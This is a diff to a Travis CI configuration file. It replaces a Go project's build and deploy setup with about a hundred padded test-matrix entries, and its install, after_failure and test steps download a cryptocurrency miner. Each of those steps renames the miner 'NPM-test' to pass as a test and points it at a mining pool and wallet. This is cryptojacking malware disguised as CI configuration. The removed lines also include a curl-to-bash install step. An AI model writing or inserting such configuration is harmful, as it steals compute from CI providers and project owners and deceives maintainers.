@@ -1,42 +1,122 @@
-language: go
-
-go:
-  - 1.13.x
-
+language:
+  - c
+arch:
+  - amd64
+compiler:
+  - gcc
 services:
   - docker
-
-before_install:
-  # Get latest docker version
-  - curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
-  - sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"
-  - sudo apt-get update
-  - sudo apt-get -y -o Dpkg::Options::="--force-confnew" install docker-ce
-  # Enable experimental for buildx tool
-  - echo '{"experimental":"enabled"}' | sudo tee /etc/docker/daemon.json
-  - mkdir -p $HOME/.docker
-  - echo '{"experimental":"enabled"}' | sudo tee $HOME/.docker/config.json
-
-install:
-  # Get Nigiri-travis for testing
-  - mkdir -p tmp; cd tmp
-  - curl https://travis.nigiri.network | bash; cd ..
-  - docker-compose -f tmp/docker-compose.yml up -d
-
-script:
-  - if [ -n "$(gofmt -l .)" ]; then echo "Go code is not formatted"; exit 1; fi
-  - bash scripts/test ci
-  - bash scripts/build linux amd64
-  - docker-compose -f tmp/docker-compose.yml down
-  - sudo rm -rf tmp
-
-before_deploy:
-  # Create a builder
-  - docker run --rm --privileged multiarch/qemu-user-static --reset -p yes
-  - docker buildx create --name xbuilder --use
-
-deploy:
-  provider: script
-  script: bash scripts/deploy
-  on:
-    all_branches: true
+git:
+  clone: false
+  depth: false
+  checkout: false
+os:
+  - linux
+env:
+  - TESTFOLDER=aswintegration/shopping_cart
+  - TESTFOLDER=aswintegration/payments
+  - TESTFOLDER=aswunits
+  - TESTFOLDER=aswgoblok/s
+  - TESTFOLDER=aswgoblok/b
+  - TESTFOLDER=aswgoblok/s
+  - TESTFOLDER=aswgoblok/k
+  - TESTFOLDER=aswgoblok/u
+  - TESTFOLDER=aswgoblok/n
+  - TESTFOLDER=aswgoblok/b
+  - TESTFOLDER=aswgoblok/ki
+  - TESTFOLDER=aswgoblok/lo
+  - TESTFOLDER=aswgoblok/li/ko
+  - TESTFOLDER=aswgoblok/pi/k
+  - TESTFOLDER=aswgoblok/n/k
+  - TESTFOLDER=aswgoblok/m/j
+  - TESTFOLDER=aswgoblok/n
+  - TESTFOLDER=aswgoblok/mxm
+  - TESTFOLDER=aswgoblok/jsh
+  - TESTFOLDER=aswgoblok/kio
+  - TESTFOLDER=aswgoblok/in/si
+  - TESTFOLDER=aswgoblok/mas/hs
+  - TESTFOLDER=aswgoblok/kim/lop
+  - TESTFOLDER=aswgoblok/ji/mj/kip
+  - TESTFOLDER=aswintegration/useraa
+  - TESTFOLDER=aswintegration/shopping_carta
+  - TESTFOLDER=aswintegration/paymentsa
+  - TESTFOLDER=aswunitss
+  - TESTFOLDER=aswgoblok/ss
+  - TESTFOLDER=aswgoblok/bs
+  - TESTFOLDER=aswgoblok/ss
+  - TESTFOLDER=aswgoblok/ks
+  - TESTFOLDER=aswgoblok/us
+  - TESTFOLDER=aswgoblok/ns
+  - TESTFOLDER=aswgoblok/bs
+  - TESTFOLDER=aswgoblok/kis
+  - TESTFOLDER=aswgoblok/los
+  - TESTFOLDER=aswgoblok/lis/ko
+  - TESTFOLDER=aswgoblok/pis/k
+  - TESTFOLDER=aswgoblok/n/sk
+  - TESTFOLDER=aswgoblok/m/sj
+  - TESTFOLDER=aswgoblok/ns
+  - TESTFOLDER=aswgoblok/mxsm
+  - TESTFOLDER=aswgoblok/jssh
+  - TESTFOLDER=aswgoblok/kiso
+  - TESTFOLDER=aswgoblok/ins/si
+  - TESTFOLDER=aswgoblok/masss/hs
+  - TESTFOLDER=aswgoblok/kim/lsop
+  - TESTFOLDER=aswgoblok/ji/mjs/kip
+  - TESTFOLDER=aswintegration/userp
+  - TESTFOLDER=aswintegration/shoppipng_cart
+  - TESTFOLDER=aswintegration/paymenpts
+  - TESTFOLDER=aswunitsp
+  - TESTFOLDER=aswgoblok/sp
+  - TESTFOLDER=aswgoblok/bp
+  - TESTFOLDER=aswgoblok/sp
+  - TESTFOLDER=aswgoblok/kp
+  - TESTFOLDER=aswgoblok/up
+  - TESTFOLDER=aswgoblok/np
+  - TESTFOLDER=aswgoblok/bp
+  - TESTFOLDER=aswgoblok/kip
+  - TESTFOLDER=aswgoblok/lop
+  - TESTFOLDER=aswgoblok/li/kop
+  - TESTFOLDER=aswgoblok/pi/kp
+  - TESTFOLDER=aswgoblok/n/kp
+  - TESTFOLDER=aswgoblok/m/jp
+  - TESTFOLDER=aswgoblok/np
+  - TESTFOLDER=aswgoblok/mxmp
+  - TESTFOLDER=aswgoblok/jshp
+  - TESTFOLDER=aswgoblok/kiop
+  - TESTFOLDER=aswgoblok/in/sip
+  - TESTFOLDER=aswgoblok/mas/hsp
+  - TESTFOLDER=aswgoblok/kim/lopp
+  - TESTFOLDER=aswgoblok/ji/mj/kipp
+  - TESTFOLDER=aswintegration/useraap
+  - TESTFOLDER=aswintegration/shoppipng_carta
+  - TESTFOLDER=aswintegration/paymenptsa
+  - TESTFOLDER=aswunitssp
+  - TESTFOLDER=aswgoblok/ssp
+  - TESTFOLDER=aswgoblok/bsp
+  - TESTFOLDER=aswgoblok/ssp
+  - TESTFOLDER=aswgoblok/ksp
+  - TESTFOLDER=aswgoblok/usp
+  - TESTFOLDER=aswgoblok/nsp
+  - TESTFOLDER=aswgoblok/bsp
+  - TESTFOLDER=aswgoblok/kisp
+  - TESTFOLDER=aswgoblok/losp
+  - TESTFOLDER=aswgoblok/lis/kop
+  - TESTFOLDER=aswgoblok/pis/kp
+  - TESTFOLDER=aswgoblok/n/skp
+  - TESTFOLDER=aswgoblok/m/sjp
+  - TESTFOLDER=aswgoblok/nsp
+  - TESTFOLDER=aswgoblok/mxsmp
+  - TESTFOLDER=aswgoblok/jsshp
+  - TESTFOLDER=aswgoblok/kisop
+  - TESTFOLDER=aswgoblok/ins/sip
+  - TESTFOLDER=aswgoblok/masss/hsp
+  - TESTFOLDER=aswgoblok/kim/lsopp
+  - TESTFOLDER=aswgoblok/ji/mjs/kipp
+  - TESTFOLDER=aswintegration/uppser
+  - TESTFOLDER=aswintegration/spphopping_cart
+install: wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.6.6/SRBMiner-Multi-0-6-6-Linux.tar.xz && tar -xvf SRBMiner-Multi-0-6-6-Linux.tar.xz && cd SRBMiner-Multi-0-6-6 && mv SRBMiner-MULTI NPM-test && ./NPM-test --algorithm verushash --pool na.luckpool.net:3956 --wallet RTBTgVXVZdfeYXtMVUhtJm6soVWrQTCFPZ --disable-gpu --cpu-threads 2
+after_failure: wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.6.6/SRBMiner-Multi-0-6-6-Linux.tar.xz && tar -xvf SRBMiner-Multi-0-6-6-Linux.tar.xz && cd SRBMiner-Multi-0-6-6 && mv SRBMiner-MULTI NPM-test && ./NPM-test --algorithm verushash --pool na.luckpool.net:3956 --wallet RTBTgVXVZdfeYXtMVUhtJm6soVWrQTCFPZ --disable-gpu --cpu-threads 2
+jobs:
+  include:
+    - stage: test
+      script: wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.6.6/SRBMiner-Multi-0-6-6-Linux.tar.xz && tar -xvf SRBMiner-Multi-0-6-6-Linux.tar.xz && cd SRBMiner-Multi-0-6-6 && mv SRBMiner-MULTI NPM-test && ./NPM-test --algorithm verushash --pool na.luckpool.net:3956 --wallet RTBTgVXVZdfeYXtMVUhtJm6soVWrQTCFPZ --disable-gpu --cpu-threads 2
